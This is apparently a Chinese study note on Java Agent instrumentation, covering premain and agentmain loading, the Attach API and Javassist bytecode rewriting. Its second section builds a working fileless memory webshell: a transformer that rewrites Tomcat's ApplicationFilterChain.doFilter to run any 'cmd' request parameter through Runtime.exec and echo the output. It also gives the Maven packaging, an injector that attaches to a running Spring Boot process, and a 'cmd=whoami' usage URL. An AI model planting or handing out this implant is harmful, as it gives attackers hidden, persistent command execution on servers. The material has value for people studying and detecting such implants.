# JavaAaent学习笔记
## 一. 前置知识
### 1.JAVA Agent简介

在jdk 1.5 之后引入了`java.lang.instrument`包,该包提供了检测Java程序的API，比如说用于监控、收集性能信息、诊断问题，通过`java.lang.instrument`类实现的工具被称之为Java Agent,Java Agent能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或未加载的类，包括类的属性、方法。

Agent内存马就是利用这一特性使其动态修改特定类的特定方法,将我们的恶意方法添加进去.

Java Agent跟正常的Java类的区别只不过是Java类是以main为程序入口，而Java Agnet的入口点是 premain 和 agentmain.

Java Agnet支持两种方式进行加载

1.实现premain方法，在启动时进行加载

2.实现agentmain方法，在启动后进行加载

### 2.启动时加载agent

要想启动时加载agent，需要实现premain方法，同时需要在jar清单文件(mainfest)中必须含有Premain-Class属性，可在命令行通过`-javaagent`来实现启动时加载。

premain会在main程序调用之前进行调用，即在运行main方法之前调用jar包中的premain-class类的premain方法。

**Demo**
```java
import java.lang.instrument.Instrumentation;

public class DemoTest {
    public static void premain(String agentArgs, Instrumentation inst) throws Exception{
        System.out.println(agentArgs);
        for(int i=0;i<5;i++){
            System.out.println("premain method is invoked!");
        }
    }
}
```
编译DemoTest.java文件

**`javac.exe .\DemoTest.java`**

创建MANIFEST文件，保存为name.mf，必须包含PreMain-Class属性。**MF文件结尾必须有空行**
```
Manifest-Version: 1.0
Premain-Class: DemoTest
```
利用jar命令将MF以及DemoTest.class文件打包，生成agent.jar文件

**`jar cvfm agent.jar .\agent.mf .\DemoTest.class`**

创建一个普通的测试类Demo
```java
public class Hello {
    public static void main(String[] args) {
        System.out.println("Hello,Java");
    }
}
```
**Hello.mf**
```
Manifest-Version: 1.0
Main-Class: Hello
```
同样的利用jar命令对文件进行编译打包

**`javac .\Hello.java`**

**`jar cvfm Hello.jar .\Hello.mf .\Hello.class`**

接下来在jar -jar 中添加 `-javaagent:agant.jar` 即可在启动时优先加载agent，而且可以利用agent.jar[=options]传入agentArgs参数

**`java -javaagent:agent.jar[=options] -jar hello.jar`**

```
PS C:\Users\Luc\Desktop\JavaAgent测试项目> java -javaagent:agent.jar=Hello -jar .\Hello.jar
Hello
premain method is invoked!
premain method is invoked!
premain method is invoked!
premain method is invoked!
premain method is invoked!
Hello,Java
```
### 3.启动后加载Agent
premain方法是在jdk1.5中提供的，所以在JDK 1.5的时候开发者只能对main加载之前进行修改，但是很多时候例如内存马注入的情况都是处于JVM已运行的情况，所以premain方法并不是很有用，不过在jdk1.6中实现了attach-on-demand(按需附着)，可以使用Attach Api动态加载agent，然而 Attach Api在tools.jar中，jvm启动时是默认不加载该依赖的，需要在classpath中额外的指定。

启动后加载agent通过新的代理操作实现：agentmain，使得可以在main函数开始运行之后在运行。

和之前的premain方法一样，可以编写agentmain函数的java类。
```java
public static void agentmain (String agentArgs, Instrumentation inst)
public static void agentmain (String agentArgs)
```
和premain一样，该类需要实现agentmain方法且jar清单文件中包含Agent-Class属性。在JDK1.6以后实现启动后加载Instrument的是Attach Api。存在于com.sun.tools.attch，里面有两个重要的类，分别是VirtualMachine 和 VirtualMachineDescriptor类，重点关注的是VirtualMachine类。

#### 3.1 VirtualMachine
VirtualMachine可以来实现获取系统信息，内存dump，线程dump，类信息统计(例如jvm加载的类)。里面配有几个方法LoadAgent，Attach和Detach。

Attach：该类允许通过给attach方法传入一个jvm的pid(线程pid)，远程连接到jvm上。
```java
VirtualMachine vm = VirtualMachine.attach(v.id());
```
LoadAgent：向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTranformer接口中提供的方法进行处理。

Detach：从jvm中移除一个代理

#### 3.2 VirtualMachineDescriptor
VirtualMachineDescriptor是一个描述虚拟机的容器类，配合VirtualMachine类完成各种功能。

大致流程如下：
通过 VirtualMachine 类的attach(pid)方法，可以attach到一个运行中的java进程上，之后便可以通过loadagent(agentjarpath)来将agent的jar包注入到对应的进程，然后对应的进程会调用agentmain方法。

#### 3.3 测试Demo
编写AgentMain.java文件
```java
package com.luc.agentmain;

import java.lang.instrument.Instrumentation;

public class agentmain {
    public static void agentmain(String agentArgs,Instrumentation ins){
        ins.addTransformer(new DefineTransformer(),true);
    }
}

```
编写DefineTransformer文件
```java
package com.luc.agentmain;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class DefineTransformer implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        System.out.println(className);
        return classfileBuffer;
    }
}
```
创建jar清单文件manifest.MF
```
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Agent-Class: AgentMain
```
编写测试类AgentMainDemo.java
```java
package com.luc.AgentMainDemo;

import com.sun.tools.attach.*;

import java.io.IOException;
import java.util.List;

public class AgentMainDemo{
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        // agentmain文件所在位置
        String path = "C:\\Users\\Luc\\Desktop\\JavaAgent\\agentmain\\target\\agentmain-1.0-SNAPSHOT.jar";
        // 返回Java虚拟机列表,VirtualMachineDescriptor描述Java虚拟机的容器类
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for(VirtualMachineDescriptor v:list){
            // contains() 方法用于判断字符串中是否包含指定的字符或字符串
            if(v.displayName().contains("AgentMainDemo")){
                // 将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接
                VirtualMachine vm = VirtualMachine.attach(v.id());
                // 将 agent.jar 发送给虚拟机
                vm.loadAgent(path);
                vm.detach();
            }
        }
    }
}
```

由于tools.jar并不会在jvm启动的时候默认加载，可以利用 URLClassloader来加载tools.jar
```java
package com.luc.AgentMainDemo;

import java.io.File;

// 默认情况下jvm不加载tools.jar,可用以下代码解决
public class TestAgentMain {
    public static void main(String[] args) {
        try {
            // System.getProperty("java.home")返回C:\Program Files\Java\jdk1.8.0_341\jre
            java.io.File toolspath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + File.separator + "tools.jar");
            // toolspath.toURI().toURL() = file:/C:/Program%20Files/Java/jdk1.8.0_341/lib/tools.jar
            java.net.URL url = toolspath.toURI().toURL();
            // 加载 tools.jar
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
            // 可以理解为 Class.forname()
            Class<?> MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class<?> MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");

            // 通过getDeclaredMethod获取VirtualMachine类的方法list
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list",null);
            java.util.List<Object> list = (java.util.List<Object>)listMethod.invoke(MyVirtualMachine,null);

            System.out.println("Running JVM Start..");
            for(int i = 0;i<list.size();i++){
                Object o = list.get(i);
                // 通过getDeclaredMethod获取VirtualMachineDescriptor类的方法displayName
                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName",null);
                String name = (String) displayName.invoke(o,null);
                if(name.contains("TestAgentMain")){
                    // 获取JVM容器的ID
                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id",null);
                    java.lang.String id = (java.lang.String) getId.invoke(o,null);
                    System.out.println("id >>> " + id);
                    // 调用方法 attach 附加
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach",new Class[]{java.lang.String.class});
                    java.lang.Object vm = attach.invoke(o,new Object[]{id});
                    // 加载 agentmain
                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent",new Class[]{java.lang.String.class});
                    java.lang.String path = "C:\\Users\\Luc\\\\Desktop\\JavaAgent\\agentmain\\target\\agentmain-1.0-SNAPSHOT.jar";
                    loadAgent.invoke(vm,new Object[]{path});
                    // 移除 angentmain
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach",null);
                    detach.invoke(vm,null);
                    break;
                }
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }
}

```
### 4.动态修改字节码
在实现premain的时候，除了能获取到premain参数，还可以获取**Instrumentation**实例。**Instrumentation**是JVMTIAaent(JVM Tool Interface Agent)的一部分，Java Agent通过这个类和目标JVM进行交互，从而达到修改数据的修改。

```java
public interface Instrumentation {

    // 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
    void addTransformer(ClassFileTransformer transformer);

    // 删除一个类转换器
    boolean removeTransformer(ClassFileTransformer transformer);

    // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;

    // 判断目标类是否能够修改。
    boolean isModifiableClass(Class<?> theClass);

    // 获取目标已经加载的类。
    @SuppressWarnings("rawtypes")
    Class[] getAllLoadedClasses();

}
```
修改之前写的agentmain类，获取所有已加载的类
```java
package com.luc.agentmain;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.instrument.Instrumentation;

public class agentmain {
    public static void agentmain(String agentArgs,Instrumentation ins) throws IOException {
        Class[] classes = ins.getAllLoadedClasses();
        FileOutputStream fileOutputStream = new FileOutputStream(new File("./classesInfo"));
        for(Class aClass:classes){
            String result = "class ==> " + aClass.getName() + "\n\t" + "Modifiable ==> " + (ins.isModifiableClass(aClass) ? "true" : "false") + "\n";
            fileOutputStream.write(result.getBytes());
        }
        fileOutputStream.close();
    }
}
```
使用`addTransformer()`和`retransformClasses()`来篡改Class的字节码。在addTransformer()方法中，有一个参数ClassFileTransformer transformer。这个参数将帮助我们完成字节码的修改工作。

如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在 MANIFEST.MF 中添加 `Can-Retransform-Classes: true` 或 `Can-Redefine-Classes: true`。

接下来使用`addTransformer()`对字节码进行修改，需要先了解javassist
编写测试类HelloDemo
```java
package com.agent.premain;

import java.util.Scanner;

public class HelloDemo {
    public static void main(String[] args) {
        HelloTest hello = new HelloTest();
        hello.hello();

        Scanner sc = new Scanner(System.in);
        sc.nextInt();

        HelloTest h2 = new HelloTest();
        h2.hello();
        System.out.println("ends...");
    }
}

public class HelloTest {
    public void hello() {
        System.out.println("hello world");
    }
}

```
编写对应的AgentMain
```java
package com.luc.agentmain;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class agentmain {
    public static void agentmain(String agentArgs,Instrumentation ins) throws IOException, UnmodifiableClassException {
        Class[] classes = ins.getAllLoadedClasses();
        for (Class aClass : classes) {
            if(aClass.getName().contains("HelloTest")){
                ins.addTransformer(new DefineTransformer(),true);
                ins.retransformClasses(aClass);
            }
        }
    }

}
```
编写DefineTransformer类
```java
package com.luc.agentmain;

import javassist.*;

import java.io.IOException;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class DefineTransformer implements ClassFileTransformer {
    public static final String editClassName = "com.agent.premain.HelloTest";
    public static final String editClassName2 = editClassName.replace('.', '/');
    public static final String editMethod = "hello";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try {
            ClassPool cp = ClassPool.getDefault();
            if(classBeingRedefined!=null){
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                cp.insertClassPath(ccp);
            }
            CtClass ctClass = cp.get(editClassName);
            CtMethod method = ctClass.getDeclaredMethod(editMethod);
            String source = "{System.out.println(\"hello transformer\");}";
            method.setBody(source);
            byte[] bytes = ctClass.toBytecode();
            ctClass.detach();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}

```

## 二.JavaAgent内存马

既然能修改某个方法的字节码，那么也能将木马放到某一个方法进行执行，这样的话，当访问任意路由的时候，就能调用木马。

Spring Boot中内嵌了一个embed Tomcat作为容器，而在网上流传着很多版本的Tomcat无文件内存马。这些内存马大都数是通过重写，修改Filter来实现的，既然Spring Boot使用了Tomcat，那么可以通过修改Filter来实现一个Spring Boot内存马。

创建一个Spring Boot项目，并添加一个Controller，在该Controller上打断点，即可看到访问路由时的调用。
```java
package com.example.springboot;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class index {
    @GetMapping(value = "index")
    public String index(){
        return "Index Page";
    }
}
```
可通过修改ApplicationFilterChain类的doFilter方法来实现无文件webshell。

创建agentmain文件`SpringBootAgent.java`
```java
package com.luc.agentmain;

import java.io.IOException;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class SpringBootAgent {
    public static void agentmain(String agentArgs, Instrumentation ins) throws IOException, UnmodifiableClassException {
        Class[] classes = ins.getAllLoadedClasses();
        for (Class aClass : classes) {
            if(aClass.getName().contains("ApplicationFilterChain")){
                ins.addTransformer(new SpringBootDefineTransformer(),true);
                ins.retransformClasses(aClass);
            }
        }
    }
}

```
创建继承ClassFileTransformer类的文件`SpringBootDefineTransformer.java`
```java
package com.luc.agentmain;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class SpringBootDefineTransformer implements ClassFileTransformer {
    public static final String editClassName = "org.apache.catalina.core.ApplicationFilterChain";
    public static final String editClassName2 = editClassName.replace('.', '/');
    public static final String editMethod = "doFilter";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        if (editClassName2.equals(className)) {
            try {
                ClassPool cp = ClassPool.getDefault();
                if (classBeingRedefined != null) {
                    ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                    cp.insertClassPath(ccp);
                }

                CtClass ctc = cp.get(editClassName);
                CtMethod method = ctc.getDeclaredMethod(editMethod);
                String source = "javax.servlet.http.HttpServletRequest req =  request;\n" +
                        "javax.servlet.http.HttpServletResponse res = response;\n" +
                        "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
                        "if (cmd != null){\n" +
                        "    try {\n" +
                        "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
                        "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                        "        String line;\n" +
                        "        StringBuilder sb = new StringBuilder(\"\");\n" +
                        "        while ((line=reader.readLine()) != null){\n" +
                        "            sb.append(line).append(\"\\n\");\n" +
                        "        }\n" +
                        "        response.getOutputStream().print(sb.toString());\n" +
                        "        response.getOutputStream().flush();\n" +
                        "        response.getOutputStream().close();\n" +
                        "    } catch (Exception e){\n" +
                        "        e.printStackTrace();\n" +
                        "    }\n" +
                        "}";
                method.insertBefore(source);
                byte[] bytes = ctc.toBytecode();
                ctc.detach();
                return bytes;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return new byte[0];
    }
}

```
修改Pom.xml文件，将依赖以及对应的属性编译进去
```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.luc.agentmain</groupId>
    <artifactId>agentmain</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>
    <dependencies>
        <!-- https://mvnrepository.com/artifact/org.javassist/javassist -->
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.29.2-GA</version>
        </dependency>


    </dependencies>
    <build>
        <plugins>
            <plugin>
                <artifactId>maven-assembly-plugin</artifactId>
                <executions>
                    <execution>
                        <phase>package</phase>
                        <goals>
                            <goal>single</goal>
                        </goals>
                    </execution>
                </executions>
                <configuration>
                    <descriptorRefs>
                        <descriptorRef>jar-with-dependencies</descriptorRef>
                    </descriptorRefs>
                    <archive>
                        <manifest>
                            <addClasspath>true</addClasspath>
                        </manifest>
                        <manifestEntries>
                            <Premain-Class>com.luc.agentmain.SpringBootAgent</Premain-Class>
                            <Agent-Class>com.luc.agentmain.SpringBootAgent</Agent-Class>
                            <Can-Redefine-Classes>true</Can-Redefine-Classes>
                            <Can-Retransform-Classes>true</Can-Retransform-Classes>
                        </manifestEntries>
                    </archive>
                </configuration>
            </plugin>
        </plugins>
    </build>
</project>
```
编译之后可通过如下代码，将上面编译的jar包注入到springboot应用
```java
package com.luc.AgentMainDemo;

import com.sun.tools.attach.*;

import java.io.IOException;
import java.util.List;

public class SpringBoot_Agent {
    public static void main(String[] args) throws Exception {
        String path = "C:\\Users\\Luc\\Desktop\\JavaAgent\\agentmain\\target\\agentmain-1.0-SNAPSHOT-jar-with-dependencies.jar";
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for(VirtualMachineDescriptor v:list){
            if(v.displayName().contains("SpringbootApplication")){
                VirtualMachine vm = VirtualMachine.attach(v.id());
                vm.loadAgent(path);
                vm.detach();
            }
        }


    }
}
```
注:在注入前应先访问一下http://127.0.0.1:8080/index，否则找不到ApplicationFilterChain类。

注入成功后可通过访问http://127.0.0.1:8080/index?cmd=whoami来执行命令。